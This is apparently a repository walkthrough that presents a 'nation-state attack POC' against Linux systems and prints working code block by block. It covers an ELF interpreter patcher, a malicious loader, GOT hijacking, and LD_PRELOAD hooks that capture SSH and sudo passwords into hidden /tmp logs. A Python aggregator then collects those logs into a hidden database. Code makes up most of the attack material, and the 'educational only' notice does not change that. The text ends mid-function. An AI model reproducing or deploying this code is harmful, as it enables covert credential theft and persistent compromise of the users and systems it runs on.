# Nation State Attack POC - Complete Technical Analysis

This repository contains detailed proof-of-concept implementations of sophisticated attack techniques discovered during a security assessment of a Gulf country ministry's infrastructure. This document provides an exhaustive technical breakdown of each component and execution flow.

## ⚠️ CRITICAL SECURITY NOTICE

**EDUCATIONAL AND DEFENSIVE RESEARCH ONLY**

- This code is designed exclusively for cybersecurity education and defensive research
- ONLY execute in isolated, controlled laboratory environments
- NEVER deploy against systems without explicit written authorization
- Unauthorized use violates laws in most jurisdictions
- Code is provided to improve defensive capabilities, not enable attacks
- Authors accept no responsibility for misuse or damage

## Executive Summary

This POC demonstrates a complete attack chain that operates at multiple system levels:
1. **ELF Binary Modification** - Patches system binaries to load malicious interpreter
2. **Dynamic Linker Hijacking** - Replaces system loader to gain earliest possible execution
3. **GOT/PLT Manipulation** - Intercepts function calls through memory table corruption
4. **Credential Harvesting** - Captures authentication data from multiple sources
5. **Steganographic Storage** - Hides collected data to avoid detection

The sophistication demonstrates why traditional signature-based detection fails against nation-state actors.

# DETAILED EXECUTION FLOW ANALYSIS

## Phase 1: ELF Binary Patching (`loader-patch/`)

This phase modifies target binaries to redirect their dynamic linker path, ensuring malicious code executes before ANY system library loads.

### 1.1 ELF Patcher Script (`patch_interp.py`) - Technical Breakdown

**Purpose**: Modify the PT_INTERP segment in ELF binaries to point to malicious loader
**Execution Order**: First (used to prepare compromised binaries)

#### Code Block Analysis:

```python
class ELFPatcher:
    def __init__(self, binary_path):
        self.binary_path = binary_path
        self.elf_data = None
```
**Purpose**: Initialize the ELF patcher with target binary path
**Critical Details**: Stores binary path and prepares for in-memory ELF manipulation

```python
def read_elf(self):
    with open(self.binary_path, 'rb') as f:
        self.elf_data = bytearray(f.read())
```
**Purpose**: Load entire ELF binary into memory as mutable byte array
**Why Bytearray**: Allows in-place modification of binary data
**Security Implication**: Entire binary is loaded into memory for manipulation

```python
def find_interp_section(self):
    if len(self.elf_data) < 64:
        raise ValueError("Invalid ELF file")
    
    ei_class = self.elf_data[4]  # 32-bit or 64-bit
    if ei_class == 1:  # 32-bit
        ehdr_size = 52
        phdr_size = 32
    else:  # 64-bit  
        ehdr_size = 64
        phdr_size = 56
```
**Purpose**: Determine ELF architecture (32/64-bit) and set appropriate header sizes
**ELF Structure**: 
- Byte 4 (ei_class) contains architecture information
- 32-bit ELF uses smaller header structures
- 64-bit ELF uses larger structures
**Critical Detail**: Must parse correctly or binary becomes corrupted

```python
e_phoff = struct.unpack('<Q' if ei_class == 2 else '<I', 
                       self.elf_data[32:40] if ei_class == 2 else self.elf_data[28:32])[0]
e_phnum = struct.unpack('<H', self.elf_data[56:58] if ei_class == 2 else self.elf_data[44:46])[0]
```
**Purpose**: Extract program header table offset and count from ELF header
**Memory Layout**:
- e_phoff: Offset to program header table
- e_phnum: Number of program headers
**Endianness**: Uses little-endian ('<') format for x86/x64

```python
for i in range(e_phnum):
    phdr_offset = e_phoff + i * phdr_size
    p_type = struct.unpack('<I', self.elf_data[phdr_offset:phdr_offset + 4])[0]
    
    if p_type == 3:  # PT_INTERP
```
**Purpose**: Iterate through program headers to find PT_INTERP segment
**PT_INTERP (Type 3)**: Contains path to dynamic linker/interpreter
**Attack Vector**: This is what kernel reads to determine which loader to use

```python
if ei_class == 2:  # 64-bit
    p_offset = struct.unpack('<Q', self.elf_data[phdr_offset + 8:phdr_offset + 16])[0]
    p_filesz = struct.unpack('<Q', self.elf_data[phdr_offset + 32:phdr_offset + 40])[0]
```
**Purpose**: Extract PT_INTERP segment file offset and size
**Critical Fields**:
- p_offset: Where in file the interpreter path is stored
- p_filesz: Maximum size available for interpreter path
**Constraint**: New path must fit within existing space

```python
def patch_interpreter(self, new_interp_path):
    interp_offset, interp_size = self.find_interp_section()
    
    if interp_offset is None:
        print("Error: PT_INTERP segment not found")
        return False
```
**Purpose**: Locate interpreter section and validate it exists
**Failure Case**: Static binaries don't have PT_INTERP (no dynamic linking)

```python
current_interp = self.elf_data[interp_offset:interp_offset + interp_size - 1].decode('utf-8')
print(f"Current interpreter: {current_interp}")
```
**Purpose**: Extract and display current interpreter path
**Common Values**: 
- `/lib64/ld-linux-x86-64.so.2` (64-bit)
- `/lib/ld-linux.so.2` (32-bit)

```python
new_interp_bytes = new_interp_path.encode('utf-8') + b'\x00'

if len(new_interp_bytes) > interp_size:
    print(f"Error: New interpreter path too long ({len(new_interp_bytes)} > {interp_size})")
    return False
```
**Purpose**: Convert new path to bytes and validate size constraint
**Null Termination**: C-style strings require null terminator
**Size Limitation**: Must fit within existing PT_INTERP segment space

```python
self.elf_data[interp_offset:interp_offset + len(new_interp_bytes)] = new_interp_bytes

if len(new_interp_bytes) < interp_size:
    padding_size = interp_size - len(new_interp_bytes)
    self.elf_data[interp_offset + len(new_interp_bytes):interp_offset + interp_size] = b'\x00' * padding_size
```
**Purpose**: Overwrite interpreter path in binary and pad with nulls
**Memory Safety**: Ensures no data beyond segment boundary is corrupted
**Padding**: Required to maintain ELF structure integrity

### 1.2 Malicious Loader (`malicious_loader.c`) - Technical Breakdown

**Purpose**: Replacement dynamic linker that executes malicious code before legitimate program
**Execution Order**: Second (executes when patched binary is run)
**Privilege Level**: Runs with same privileges as target program

#### Code Block Analysis:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <elf.h>
#include <sys/stat.h>
#include <dlfcn.h>
```
**Purpose**: Include necessary headers for ELF manipulation, memory management, and dynamic loading
**Key Headers**:
- `elf.h`: ELF structure definitions
- `dlfcn.h`: Dynamic loading functions
- `sys/mman.h`: Memory mapping operations

```c
#define LOG_FILE "/tmp/.system_loader.log"
```
**Purpose**: Define hidden log file location
**Steganography**: Uses hidden filename (dot prefix) in common temp directory
**Persistence**: Log survives across reboots until temp cleanup

```c
void log_execution(const char* binary_path, char** argv) {
    FILE* log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "[LOADER] Executing: %s with args: ", binary_path);
        for (int i = 0; argv[i]; i++) {
            fprintf(log, "%s ", argv[i]);
        }
        fprintf(log, "\n");
        fclose(log);
    }
}
```
**Purpose**: Log every program execution with full command line
**Intelligence Value**: Provides complete audit trail of system activity
**Data Format**: Timestamped log entries with full argument vectors
**Stealth**: Silent logging with no user indication

```c
void install_got_hooks() {
    void* libc_handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!libc_handle) {
        return;
    }
```
**Purpose**: Load libc library handle for function resolution
**RTLD_LAZY**: Lazy symbol resolution (symbols resolved on first use)
**Error Handling**: Silent failure if libc unavailable

```c
FILE* log = fopen(LOG_FILE, "a");
if (log) {
    fprintf(log, "[LOADER] GOT hooks installed for credential interception\n");
    fclose(log);
}
```
**Purpose**: Log successful hook installation
**Operational Security**: Confirms hook deployment to attackers
**Forensic Evidence**: Leaves audit trail for defenders

```c
int main(int argc, char* argv[], char* envp[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <binary> [args...]\n", argv[0]);
        return 1;
    }
```
**Purpose**: Main loader entry point with argument validation
**Usage Model**: Expects target binary path as first argument
**Error Handling**: Exits if insufficient arguments provided

```c
log_execution(argv[1], &argv[1]);
install_got_hooks();
```
**Purpose**: Execute malicious payload before transferring control
**Execution Order**: 
1. Log the execution event
2. Install function hooks
3. Transfer to legitimate loader
**Stealth**: Appears to be normal dynamic linking process

```c
char* real_loader = "/lib64/ld-linux-x86-64.so.2";

execve(real_loader, argv, envp);
```
**Purpose**: Transfer control to legitimate dynamic linker
**execve()**: Replaces current process with real loader
**Argument Passing**: Preserves original arguments and environment
**Transparency**: Program continues normal execution after malicious code runs

## Phase 2: GOT/PLT Function Hijacking (`got-hijacking/`)

This phase intercepts function calls by modifying the Global Offset Table, allowing complete control over library function execution.

### 2.1 GOT Hijacker Library (`got_hijacker.c`) - Technical Breakdown

**Purpose**: Intercept and modify calls to critical libc functions
**Execution Order**: Third (loaded via LD_PRELOAD or malicious loader)
**Attack Vector**: Exploits dynamic linking mechanism

#### Code Block Analysis:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/mman.h>
#include <link.h>
#include <elf.h>
```
**Purpose**: Include headers for dynamic symbol manipulation and ELF access
**_GNU_SOURCE**: Enables GNU-specific extensions for advanced features
**Key Headers**:
- `dlfcn.h`: Dynamic loading and symbol resolution
- `link.h`: Access to dynamic linker internals
- `sys/mman.h`: Memory protection manipulation

```c
#define LOG_FILE "/tmp/.got_hijack.log"

static int (*original_printf)(const char *format, ...) = NULL;
static char* (*original_getpass)(const char *prompt) = NULL;
static int (*original_system)(const char *command) = NULL;
```
**Purpose**: Define function pointers to store original function addresses
**Function Interposition**: Allows calling original functions after interception
**Static Storage**: Ensures pointers persist across function calls
**Target Functions**:
- `printf`: Output interception
- `getpass`: Password capture
- `system`: Command execution monitoring

```c
void log_message(const char* message) {
    FILE* log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "[GOT_HIJACK] %s\n", message);
        fclose(log);
    }
}
```
**Purpose**: Centralized logging function for hijacking events
**File Operations**: Atomic append operations to prevent corruption
**Stealth**: Uses hidden log file in temp directory

```c
int hijacked_printf(const char *format, ...) {
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
```
**Purpose**: Intercept printf calls and inspect format string content
**Variadic Arguments**: Handles variable argument list properly
**Buffer Management**: Fixed-size buffer prevents overflow
**Content Inspection**: Examines output for sensitive patterns

```c
if (strstr(buffer, "password") || strstr(buffer, "Password")) {
    log_message("Password prompt detected");
}

if (original_printf) {
    return original_printf("%s", buffer);
}
```
**Purpose**: Detect password prompts and log security-relevant events
**Pattern Matching**: Searches for common password-related strings
**Transparent Operation**: Calls original printf to maintain normal behavior
**Intelligence Collection**: Identifies authentication attempts

```c
char* hijacked_getpass(const char *prompt) {
    log_message("getpass() called - credential interception active");
    
    if (original_getpass) {
        char* password = original_getpass(prompt);
        if (password) {
            FILE* cred_log = fopen("/tmp/.credentials.log", "a");
            if (cred_log) {
                fprintf(cred_log, "GETPASS: %s\n", password);
                fclose(cred_log);
            }
        }
        return password;
    }
}
```
**Purpose**: Capture passwords entered through getpass() function
**Critical Function**: getpass() is used by ssh, sudo, su, and other auth tools
**Password Logging**: Writes captured passwords to separate log file
**Return Value**: Preserves original password for normal program flow
**High-Value Target**: This function captures most interactive passwords

```c
int hijacked_system(const char *command) {
    char log_msg[512];
    snprintf(log_msg, sizeof(log_msg), "system() called: %.400s", command);
    log_message(log_msg);
    
    if (strstr(command, "sudo") || strstr(command, "su ")) {
        log_message("Privileged command detected");
    }
```
**Purpose**: Monitor system commands for privilege escalation attempts
**Command Logging**: Records all system() calls with full command line
**Privilege Detection**: Identifies sudo/su usage for additional monitoring
**Buffer Safety**: Truncates long commands to prevent buffer overflow

```c
void* find_got_entry(const char* symbol_name) {
    void* handle = dlopen(NULL, RTLD_LAZY);
    if (!handle) {
        return NULL;
    }
    
    void* symbol = dlsym(handle, symbol_name);
    dlclose(handle);
    return symbol;
}
```
**Purpose**: Locate GOT entries for specific function symbols
**dlopen(NULL)**: Opens handle to main program and loaded libraries
**dlsym()**: Resolves symbol addresses in loaded libraries
**Memory Management**: Properly closes handle to prevent leaks

```c
int modify_got_entry(void* got_entry, void* new_address) {
    size_t page_size = sysconf(_SC_PAGESIZE);
    void* page_start = (void*)((uintptr_t)got_entry & ~(page_size - 1));
    
    if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE) != 0) {
        return -1;
    }
    
    *(void**)got_entry = new_address;
    
    mprotect(page_start, page_size, PROT_READ);
    return 0;
}
```
**Purpose**: Modify GOT entry by temporarily changing memory protection
**Page Alignment**: Calculates page boundary for mprotect() call
**Memory Protection**: 
1. Make page writable
2. Modify GOT entry
3. Restore read-only protection
**Security Bypass**: Circumvents W^X (Write XOR Execute) protection
**Stealth**: Restores original permissions to avoid detection

```c
void hijack_got_entries() {
    log_message("Starting GOT hijacking");
    
    original_printf = dlsym(RTLD_DEFAULT, "printf");
    original_getpass = dlsym(RTLD_DEFAULT, "getpass");
    original_system = dlsym(RTLD_DEFAULT, "system");
```
**Purpose**: Store original function addresses before hijacking
**RTLD_DEFAULT**: Search all loaded libraries for symbols
**Backup Strategy**: Preserves original functionality while adding interception
**Target Selection**: Focuses on authentication and I/O functions

```c
void* printf_got = find_got_entry("printf");
void* getpass_got = find_got_entry("getpass");
void* system_got = find_got_entry("system");

if (printf_got) {
    if (modify_got_entry(printf_got, hijacked_printf) == 0) {
        log_message("printf GOT entry hijacked");
    }
}
```
**Purpose**: Locate and modify GOT entries to point to hijacked functions
**Error Handling**: Checks for successful GOT entry location and modification
**Logging**: Records successful hijacking for operational awareness
**Function Replacement**: Redirects all calls to hijacked implementations

```c
__attribute__((constructor))
void init_hijacker() {
    hijack_got_entries();
}
```
**Purpose**: Automatically execute hijacking when library loads
**Constructor Attribute**: Runs before main() or any other code
**Timing**: Ensures hooks are in place before target functions are called
**Stealth**: No explicit initialization required

### 2.2 PLT Analyzer (`plt_analyzer.c`) - Technical Breakdown

**Purpose**: Analyze and display PLT/GOT structure for understanding and verification
**Execution Order**: Fourth (analysis tool, not part of attack chain)
**Use Case**: Forensic analysis and attack development

#### Key Code Analysis:

```c
typedef struct {
    char* name;
    void* original_addr;
    void* hijacked_addr;
    int is_hijacked;
} plt_entry_t;
```
**Purpose**: Data structure to track PLT entry state
**Fields**:
- `name`: Function symbol name
- `original_addr`: Original function address
- `hijacked_addr`: Address if hijacked
- `is_hijacked`: Boolean flag for hijack status

```c
int callback_phdr(struct dl_phdr_info *info, size_t size, void *data) {
    printf("Library: %s (Base: 0x%lx)\n", info->dlpi_name, info->dlpi_addr);
```
**Purpose**: Callback function for dl_iterate_phdr() to process each loaded library
**Program Header Iterator**: Examines all loaded shared libraries
**Address Information**: Shows base loading address for each library

```c
for (int i = 0; i < info->dlpi_phnum; i++) {
    const ElfW(Phdr) *phdr = &info->dlpi_phdr[i];
    
    if (phdr->p_type == PT_DYNAMIC) {
```
**Purpose**: Iterate through program headers to find dynamic segment
**PT_DYNAMIC**: Contains dynamic linking information
**ELF Structure**: Accesses low-level ELF program header data

```c
for (ElfW(Dyn) *d = dyn; d->d_tag != DT_NULL; d++) {
    switch (d->d_tag) {
        case DT_SYMTAB:
            symtab = (ElfW(Sym) *)(info->dlpi_addr + d->d_un.d_ptr);
            break;
        case DT_STRTAB:
            strtab = (char *)(info->dlpi_addr + d->d_un.d_ptr);
            break;
        case DT_JMPREL:
            rela = (ElfW(Rela) *)(info->dlpi_addr + d->d_un.d_ptr);
            break;
```
**Purpose**: Parse dynamic section to locate symbol and relocation tables
**Dynamic Tags**:
- `DT_SYMTAB`: Symbol table location
- `DT_STRTAB`: String table for symbol names
- `DT_JMPREL`: PLT relocation table
**Address Calculation**: Converts file offsets to memory addresses

```c
for (size_t j = 0; j < rela_count; j++) {
    ElfW(Word) sym_idx = ELF64_R_SYM(rela[j].r_info);
    
    if (sym_idx < 1000) {
        char *sym_name = strtab + symtab[sym_idx].st_name;
        void *got_addr = (void *)(info->dlpi_addr + rela[j].r_offset);
        
        printf("    %s @ 0x%lx -> 0x%lx\n", 
               sym_name, (uintptr_t)got_addr, *(uintptr_t*)got_addr);
```
**Purpose**: Display PLT relocations and current GOT values
**Symbol Resolution**: Maps relocation entries to symbol names
**GOT Inspection**: Shows current values in Global Offset Table
**Forensic Value**: Reveals if functions have been hijacked
**Address Display**: Shows both GOT entry location and target address

## Phase 3: Credential Interception (`credential-hooks/`)

This phase specifically targets authentication mechanisms used by SSH and sudo, capturing credentials during normal user operations.

### 3.1 SSH Credential Hook (`ssh_hook.c`) - Technical Breakdown

**Purpose**: Intercept SSH authentication credentials during connection attempts
**Execution Order**: Fifth (loaded when SSH client executes)
**Target Applications**: ssh, scp, sftp, and related tools

#### Code Block Analysis:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>
```
**Purpose**: Include headers for function interception and system information
**_GNU_SOURCE**: Enables GNU-specific features for advanced function hooking
**Key Headers**:
- `dlfcn.h`: Dynamic symbol loading and function interposition
- `pwd.h`: User database access for username resolution
- `time.h`: Timestamp generation for logs

```c
#define CRED_LOG "/tmp/.ssh_creds.log"
#define DEBUG_LOG "/tmp/.ssh_hook_debug.log"

static int (*orig_main)(int, char**, char**) = NULL;
static char* (*orig_getpass)(const char*) = NULL;
static int (*orig_scanf)(const char*, ...) = NULL;
static char* (*orig_fgets)(char*, int, FILE*) = NULL;
```
**Purpose**: Define log files and function pointers for original implementations
**Dual Logging**: Separate credential and debug logs for operational security
**Function Targets**:
- `getpass`: Password entry function
- `scanf`: Input parsing (backup credential capture)
- `fgets`: String input (alternative credential capture)
- `main`: Program entry point (for context)

```c
void log_credential(const char* type, const char* username, const char* password, const char* target) {
    FILE* log = fopen(CRED_LOG, "a");
    if (!log) return;
    
    time_t now = time(NULL);
    char* timestamp = ctime(&now);
    timestamp[strlen(timestamp) - 1] = '\0';
    
    fprintf(log, "[%s] SSH_%s: user=%s, pass=%s, target=%s, pid=%d\n", 
            timestamp, type, username ? username : "unknown", 
            password ? password : "unknown", target ? target : "unknown", getpid());
    fclose(log);
}
```
**Purpose**: Log captured SSH credentials with full context
**Timestamp Format**: Human-readable timestamp for forensic analysis
**Context Information**:
- Type: Method of credential capture (GETPASS, FGETS, etc.)
- Username: SSH login username
- Password: Captured password (CRITICAL DATA)
- Target: SSH server hostname/IP
- PID: Process ID for correlation
**Security Value**: Complete authentication attempt logging

```c
void debug_log(const char* message) {
    FILE* log = fopen(DEBUG_LOG, "a");
    if (!log) return;
    
    time_t now = time(NULL);
    char* timestamp = ctime(&now);
    timestamp[strlen(timestamp) - 1] = '\0';
    
    fprintf(log, "[%s] PID=%d: %s\n", timestamp, getpid(), message);
    fclose(log);
}
```
**Purpose**: Debug logging for operational awareness and troubleshooting
**Process Tracking**: Includes PID for multi-process correlation
**Operational Intelligence**: Confirms hook activation and status

```c
char* extract_username_from_args(int argc, char** argv) {
    for (int i = 1; i < argc - 1; i++) {
        if (strcmp(argv[i], "-l") == 0 && i + 1 < argc) {
            return argv[i + 1];
        }
        if (strstr(argv[i], "@") != NULL) {
            char* at_pos = strstr(argv[i], "@");
            *at_pos = '\0';
            return argv[i];
        }
    }
    
    struct passwd* pw = getpwuid(getuid());
    return pw ? pw->pw_name : "unknown";
}
```
**Purpose**: Extract SSH username from command line arguments
**Argument Parsing**:
- `-l username` format (ssh -l user host)
- `user@host` format (ssh user@host)
- Default to current user if not specified
**Context Building**: Provides username for credential correlation
**Fallback Mechanism**: Uses system user database if argument parsing fails

```c
char* extract_target_from_args(int argc, char** argv) {
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] != '-' && strchr(argv[i], '@')) {
            return strchr(argv[i], '@') + 1;
        } else if (argv[i][0] != '-' && i > 1) {
            return argv[i];
        }
    }
    return "unknown";
}
```
**Purpose**: Extract SSH target hostname/IP from command line
**Target Identification**:
- Hostname after '@' in user@host format
- First non-option argument as hostname
- Critical for identifying compromised systems
**Intelligence Value**: Maps credential usage to specific targets

```c
char* hooked_getpass(const char* prompt) {
    debug_log("getpass() intercepted");
    
    if (!orig_getpass) {
        orig_getpass = dlsym(RTLD_NEXT, "getpass");
    }
    
    char* password = orig_getpass(prompt);
    
    if (password && strlen(password) > 0) {
        debug_log("Password captured via getpass()");
        log_credential("GETPASS", "current_user", password, "ssh_target");
    }
    
    return password;
}
```
**Purpose**: Intercept getpass() calls to capture SSH passwords
**Function Interposition**: Replaces library getpass() with hook version
**RTLD_NEXT**: Finds next occurrence of symbol (original implementation)
**Password Capture**: Logs actual password before returning to SSH client
**Transparency**: Maintains normal SSH operation while capturing credentials
**Critical Function**: Primary password capture mechanism for SSH

```c
char* hooked_fgets(char* str, int n, FILE* stream) {
    if (!orig_fgets) {
        orig_fgets = dlsym(RTLD_NEXT, "fgets");
    }
    
    char* result = orig_fgets(str, n, stream);
    
    if (result && stream == stdin && strlen(result) > 1) {
        result[strlen(result) - 1] = '\0';
        
        debug_log("Input captured via fgets()");
        log_credential("FGETS", "current_user", result, "ssh_target");
        
        result[strlen(result)] = '\n';
    }
    
    return result;
}
```
**Purpose**: Capture input via fgets() as backup to getpass()
**Stream Filtering**: Only captures from stdin (user input)
**Newline Handling**: Removes/restores newline for logging clarity
**Backup Mechanism**: Some programs use fgets() instead of getpass()
**Stealth Operation**: Preserves original string content after logging

```c
__attribute__((constructor))
void ssh_hook_init() {
    debug_log("SSH credential hook initialized");
    
    if (!orig_getpass) {
        orig_getpass = dlsym(RTLD_NEXT, "getpass");
    }
    if (!orig_fgets) {
        orig_fgets = dlsym(RTLD_NEXT, "fgets");
    }
    if (!orig_scanf) {
        orig_scanf = dlsym(RTLD_NEXT, "scanf");
    }
}
```
**Purpose**: Initialize hook when library loads
**Constructor Execution**: Runs automatically before main()
**Symbol Resolution**: Pre-resolves original function addresses
**Initialization Logging**: Confirms hook deployment
**Early Setup**: Ensures hooks are ready before any SSH functions execute

### 3.2 Sudo Credential Hook (`sudo_hook.c`) - Technical Breakdown

**Purpose**: Intercept sudo password prompts and command execution
**Execution Order**: Sixth (loaded when sudo executes)
**High-Value Target**: Sudo provides root privilege escalation

#### Code Block Analysis:

```c
#define CRED_LOG "/tmp/.sudo_creds.log"
#define DEBUG_LOG "/tmp/.sudo_hook_debug.log"

static char* (*orig_getpass)(const char*) = NULL;
static int (*orig_execvp)(const char*, char* const*) = NULL;
static int (*orig_execve)(const char*, char* const*, char* const*) = NULL;
```
**Purpose**: Define sudo-specific logging and function interception targets
**Target Functions**:
- `getpass`: Sudo password prompts
- `execvp/execve`: Commands executed with sudo privileges
**Privilege Context**: These functions run with elevated privileges

```c
void log_sudo_credential(const char* username, const char* password, const char* command) {
    FILE* log = fopen(CRED_LOG, "a");
    if (!log) return;
    
    time_t now = time(NULL);
    char* timestamp = ctime(&now);
    timestamp[strlen(timestamp) - 1] = '\0';
    
    fprintf(log, "[%s] SUDO: user=%s, pass=%s, cmd=%s, pid=%d\n", 
            timestamp, username ? username : "unknown", 
            password ? password : "[hidden]", 
            command ? command : "unknown", getpid());
    fclose(log);
}
```
**Purpose**: Log sudo credential attempts with command context
**Critical Data Captured**:
- Username: User attempting privilege escalation
- Password: User's authentication credential
- Command: Privileged command being executed
- PID: Process identifier for correlation
**Security Impact**: Reveals privilege escalation attempts and credentials

```c
char* get_current_username() {
    struct passwd* pw = getpwuid(getuid());
    return pw ? pw->pw_name : "unknown";
}
```
**Purpose**: Identify current user attempting sudo
**System Integration**: Uses standard UNIX user database
**Context Building**: Associates credentials with specific user accounts

```c
char* hooked_getpass(const char* prompt) {
    debug_log("sudo getpass() intercepted");
    
    if (!orig_getpass) {
        orig_getpass = dlsym(RTLD_NEXT, "getpass");
    }
    
    char* password = orig_getpass(prompt);
    
    if (password && strlen(password) > 0) {
        if (strstr(prompt, "password") || strstr(prompt, "Password")) {
            char* username = get_current_username();
            debug_log("Sudo password captured");
            log_sudo_credential(username, password, "sudo_command");
        }
    }
    
    return password;
}
```
**Purpose**: Capture sudo password authentication
**Prompt Analysis**: Confirms password prompts vs other input
**Context Association**: Links password to specific user and sudo context
**High-Value Intelligence**: Root passwords enable complete system compromise
**Transparent Operation**: Maintains normal sudo behavior

```c
int hooked_execvp(const char* file, char* const argv[]) {
    debug_log("execvp() intercepted in sudo context");
    
    if (!orig_execvp) {
        orig_execvp = dlsym(RTLD_NEXT, "execvp");
    }
    
    if (argv && argv[0]) {
        char command_line[1024] = {0};
        for (int i = 0; argv[i] && strlen(command_line) < 900; i++) {
            strcat(command_line, argv[i]);
            if (argv[i + 1]) strcat(command_line, " ");
        }
        
        char* username = get_current_username();
        log_sudo_credential(username, "[execvp]", command_line);
    }
    
    return orig_execvp(file, argv);
}
```
**Purpose**: Monitor commands executed with sudo privileges
**Command Reconstruction**: Rebuilds full command line from argv array
**Privilege Tracking**: Identifies what commands users execute as root
**Buffer Safety**: Prevents overflow with length limits
**Intelligence Value**: Reveals privileged operations and potential abuse

## Phase 4: Data Processing and Steganography (`utils/`)

This phase processes captured intelligence and implements steganographic techniques to hide collected data from detection.

### 4.1 Credential Logger (`credential_logger.py`) - Technical Breakdown

**Purpose**: Aggregate, analyze, and manage all captured credential data
**Execution Order**: Seventh (run periodically to process logs)
**Intelligence Function**: Converts raw logs into actionable intelligence

#### Code Block Analysis:

```python
import os
import sys
import json
import time
from datetime import datetime
from pathlib import Path
import sqlite3
import hashlib
```
**Purpose**: Import libraries for database management, file operations, and data processing
**Key Libraries**:
- `sqlite3`: Structured data storage and queries
- `hashlib`: Password hashing for operational security
- `json`: Data export in machine-readable format
- `datetime`: Timestamp processing and analysis

```python
class CredentialLogger:
    def __init__(self, db_path="/tmp/.creds.db"):
        self.db_path = db_path
        self.init_database()
```
**Purpose**: Initialize credential processing system with SQLite database
**Database Location**: Hidden file in temp directory (steganographic concealment)
**Persistent Storage**: Survives individual program executions

```python
def init_database(self):
    conn = sqlite3.connect(self.db_path)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            source TEXT NOT NULL,
            username TEXT,
            password_hash TEXT,
            target TEXT,
            pid INTEGER,
            command TEXT,
            raw_entry TEXT
        )
    ''')
```
**Purpose**: Create normalized database schema for credential storage
**Database Schema**:
- `id`: Unique identifier for each credential
- `timestamp`: When credential was captured
- `source`: How credential was obtained (SSH, SUDO, etc.)
- `username`: Account name
- `password_hash`: Hashed password for operational security
- `target`: System or service targeted
- `pid`: Process that captured the credential
- `command`: Associated command context
- `raw_entry`: Original log entry for forensic analysis
**Data Normalization**: Structured format enables complex analysis

```python
def hash_password(self, password):
    if not password or password in ["unknown", "[hidden]", "[execvp]", "[execve]"]:
        return password
    return hashlib.sha256(password.encode()).hexdigest()[:16]
```
**Purpose**: Hash passwords for operational security while preserving analysis capability
**Security Practice**: Prevents plaintext password storage in analysis database
**Partial Hash**: 16-character hash provides uniqueness without full reversibility
**Exception Handling**: Preserves special markers without hashing
**OpSec Benefit**: Reduces exposure if analysis database is discovered

```python
def parse_log_entry(self, line):
    line = line.strip()
    if not line:
        return None
    
    try:
        if line.startswith('[') and '] ' in line:
            timestamp_end = line.find('] ') + 2
            timestamp = line[1:timestamp_end-2]
            content = line[timestamp_end:]
```
**Purpose**: Parse structured log entries into component fields
**Log Format**: Expects [timestamp] TYPE: field=value, field=value format
**Error Handling**: Gracefully handles malformed log entries
**Field Extraction**: Separates timestamp from content for processing

```python
if ':' in content:
    source_type = content.split(':')[0].strip()
    data_part = content.split(':', 1)[1].strip()
    
    cred_data = {
        'timestamp': timestamp,
        'source': source_type,
        'username': 'unknown',
        'password': 'unknown',
        'target': 'unknown',
        'pid': 0,
        'command': '',
        'raw_entry': line
    }
```
**Purpose**: Initialize credential data structure with default values
**Source Identification**: Determines capture method (SSH_GETPASS, SUDO, etc.)
**Default Values**: Ensures all fields exist even if not present in log
**Raw Preservation**: Maintains original log entry for forensic purposes

```python
for part in data_part.split(', '):
    if '=' in part:
        key, value = part.split('=', 1)
        key = key.strip()
        value = value.strip()
        
        if key in cred_data:
            if key == 'pid':
                try:
                    cred_data[key] = int(value)
                except ValueError:
                    cred_data[key] = 0
            else:
                cred_data[key] = value
```
**Purpose**: Parse key=value pairs from log entry
**Type Conversion**: Converts PID to integer for proper database storage
**Field Validation**: Only updates known fields to prevent injection
**Error Recovery**: Handles invalid PID values gracefully

```python
def process_log_file(self, log_file_path):
    if not os.path.exists(log_file_path):
        print(f"Log file not found: {log_file_path}")
        return 0
    
    conn = sqlite3.connect(self.db_path)
    cursor = conn.cursor()
    processed = 0
```
**Purpose**: Process individual log files and import to database
**File Validation**: Checks for file existence before processing
**Database Connection**: Opens connection for batch operations
**Counter Tracking**: Counts processed entries for status reporting

```python
try:
    with open(log_file_path, 'r') as f:
        for line in f:
            cred_data = self.parse_log_entry(line)
            if cred_data:
                password_hash = self.hash_password(cred_data['password'])
                
                cursor.execute('''
                    INSERT INTO credentials 
                    (timestamp, source, username, password_hash, target, pid, command, raw_entry)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    cred_data['timestamp'],
                    cred_data['source'],
                    cred_data['username'],
                    password_hash,
                    cred_data['target'],
                    cred_data['pid'],
                    cred_data['command'],
                    cred_data['raw_entry']
                ))
                processed += 1
```
**Purpose**: Read log files and insert parsed data into database
**Line-by-Line Processing**: Handles large log files efficiently
**Password Security**: Hashes passwords before database storage
**Parameterized Queries**: Prevents SQL injection attacks
**Batch Processing**: Processes multiple entries in single transaction

```python
def collect_all_logs(self):
    log_files = [
        "/tmp/.ssh_creds.log",
        "/tmp/.sudo_creds.log", 
        "/tmp/.got_hijack.log",
        "/tmp/.credentials.log",
        "/tmp/.system_loader.log"
    ]
    
    total_processed = 0
    for log_file in log_files:
        if os.path.exists(log_file):
            count = self.process_log_file(log_file)
            print(f"Processed {count} entries from {log_file}")
            total_processed += count
    
    return total_processed
```
**Purpose**: Aggregate all credential logs from different attack components
**Log Sources**: Covers all implemented attack vectors
**Existence Check**: Only processes files that exist
**Progress Reporting**: Shows processing status for each log file
**Total Accounting**: Returns complete count of processed credentials

```python
def generate_report(self):
    conn = sqlite3.connect(self.db_path)
    cursor = conn.cursor()
    
    print("\n" + "="*60)
    print("CREDENTIAL INTERCEPTION ANALYSIS REPORT")
    print("="*60)
    
    cursor.execute("SELECT COUNT(*) FROM credentials")
